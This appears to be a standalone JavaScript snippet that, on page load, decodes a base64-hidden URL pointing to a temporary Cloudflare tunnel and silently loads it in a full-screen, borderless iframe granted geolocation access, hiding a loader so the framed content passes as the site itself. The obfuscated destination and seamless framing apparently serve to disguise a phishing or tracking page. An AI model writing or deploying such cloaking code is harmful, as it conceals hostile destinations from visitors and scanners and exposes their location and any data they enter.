window.addEventListener('DOMContentLoaded', (event) => {

    const base64Url = "aHR0cHM6Ly9vdXRsaW5lZC12ZWdldGFibGUtc3Bpcml0LXN0dW5uaW5nLnRyeWNsb3VkZmxhcmUuY29t"; 
    
    try {
        const targetUrl = atob(base64Url.trim());
        
        const ifrm = document.createElement("iframe");
        
        ifrm.setAttribute("src", targetUrl);
        ifrm.setAttribute("id", "_view_frame");

        ifrm.setAttribute("allow", "geolocation"); 
        
        ifrm.style.width = "100%";
        ifrm.style.height = "100%";
        ifrm.style.border = "none";
        
        ifrm.style.opacity = "0";
        ifrm.style.transition = "opacity 0.5s ease";

        ifrm.onload = function() {
            ifrm.style.opacity = "1"; 
            
            setTimeout(function() {
                const loader = document.getElementById('loader');
                if (loader) {
                    loader.classList.add('hidden');
                }
            }, 300);
        };
        
        const container = document.getElementById("app_container");
        if (container) {
            container.appendChild(ifrm);
        }

    } catch (err) {
        console.error("Error decoding URL:", err);
    }
});
